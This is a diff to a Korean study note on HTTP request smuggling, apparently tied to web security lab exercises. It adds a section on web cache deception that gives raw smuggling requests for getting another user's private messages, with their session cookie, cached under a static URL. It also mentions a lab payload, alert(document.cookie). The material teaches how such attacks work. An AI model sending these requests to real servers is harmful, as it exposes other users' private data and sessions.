@@ -887,7 +887,7 @@ Foo: XGET /static/include.js HTTP/1.1
 Host: vulnerable-website.com
 ```
 
-smuggle된 요청은 Back-end 서버로부터 바로 이전 공격과 같은 응답을 밭습니다(off-site redirect). Front-end 서버는 다음과 같이 캐싱합니다 :
+smuggle된 요청은 Back-end 서버로부터 바로 이전 공격과 같은 응답을 밭습니다(off-site redirect). Front-end 서버는 `/static/include.js`로의 요청이 두 번째 요청이라고 생각하고 응답을 캐싱합니다 :
 
 **Request :**
 
@@ -916,6 +916,59 @@ Location: https://attacker-website.com/home/
 Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 특정 응답들을 캐싱하도록 설정되어 있습니다.
 
 이 랩을 풀려면, request smuggling 공격을 사용해서 캐쉬를 오염시켜야 합니다. 그래서 Javascript 파일로의 요청이 exploit server로 리다이렉트되어야 하고 오염된 캐쉬는 `alert(document.cookie)`를 실행시켜야 합니다.
+
+### 😎 Using HTTP request smuggling to perform web cache deception
+
+web cache poisoning 공격과 비슷하지만 목적이 다릅니다.
+
+- **web cache poisoning** 공격은 공격자가 어플리케이션으로 하여금 캐쉬에 악의적인 내용을 저장하게 합니다. 그리고 이 내용들은 캐쉬를 통해 다른 사용자에게 전달됩니다.
+- **web cache deception** 공격은 공격자가 어플리케이션이 다른 사용자의 민감한 정보를 캐쉬에 저장하게 합니다. 그러면 공격자가 그 내용을 캐쉬에서 가져올 수 있습니다.
+
+다음과 같이 공격자가 특정 유저만의 민감한 내용을 담은 요청을 smuggle할 수 있습니다.
+
+``` http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 43
+Transfer-Encoding: chunked
+
+0
+
+GET /private/messages HTTP/1.1
+Foo: X
+```
+
+다른 사용자가 다음 요청을 보내면 그 요청은 위의 요청에 붙게 되고 그 요청은 민감한 내용을 포함하고 있습니다 :
+
+``` http
+GET /private/messages HTTP/1.1
+Foo: XGET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+...
+```
+
+Back-end 서버는 이 요청에 대해 정상적으로 응답합니다. 만들어진 요청을 보면 URL은 private message를 향하고 있지만 Cookie는 다른 사용자의 세션 정보를 담고 있습니다. Front-end 서버는 `/static/some-image.png`요청에 대해 이 응답을 캐싱합니다. 
+
+**Request :**
+
+``` http
+GET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+```
+
+**Response :**
+
+``` http
+HTTP/1.1 200 Ok
+...
+<h1>Your private messages</h1>
+...
+```
+
+공격자는 `/static/some-image.png`를 방문해서 캐쉬로부터 다른 사용자의 민감한 정보를 얻을 수 있습니다.
+
+주의할 점은 공격자는 캐싱될 민감한 정보의 URL을 모른다는 것입니다. 왜냐하면 smuggle된 요청이 제대로 동작하기만 하면 다른 사용자가 요청한 어떤 URL이든 가능하기 때문입니다. 그래서 많은 static 경로에 대해서 원하는 정보가 저장되었는지 확인해봐야 할 수도 있습니다.
 
 ### UPDATING.. 
 
